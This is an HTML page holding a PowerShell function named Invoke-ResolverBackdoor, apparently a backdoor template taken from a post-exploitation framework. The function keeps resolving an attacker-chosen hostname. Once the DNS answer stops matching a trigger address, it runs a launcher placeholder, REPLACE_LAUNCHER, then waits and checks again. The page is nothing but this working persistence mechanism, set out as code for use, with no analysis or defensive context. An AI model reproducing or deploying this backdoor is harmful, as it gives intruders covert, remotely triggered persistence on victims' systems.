<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Resolver</title>
</head><body>function Invoke-ResolverBackdoor<br/>
{<br/>
&nbsp; &nbsp; param(<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory=$False,Position=1)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [string]$Hostname,<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory=$False,Position=2)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [string]$Trigger="127.0.0.1",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory=$False,Position=3)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [int] $Timeout=0,<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory=$False,Position=4)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [int] $Sleep=30<br/>
&nbsp; &nbsp; )<br/>
&nbsp; &nbsp; $running=$True<br/>
&nbsp; &nbsp; $match =""<br/>
&nbsp; &nbsp; $starttime = Get-Date<br/>
&nbsp; &nbsp; while($running)<br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $running=$False<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; try {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $ips = [System.Net.Dns]::GetHostAddresses($Hostname)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; foreach ($addr in $ips)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $resolved=$addr.IPAddressToString<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if($resolved -ne $Trigger)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $running=$False<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; REPLACE_LAUNCHER<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; catch [System.Net.Sockets.SocketException]{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Start-Sleep -s $Sleep<br/>
&nbsp; &nbsp; }<br/>
}<br/>
Invoke-ResolverBackdoor"""</body></html>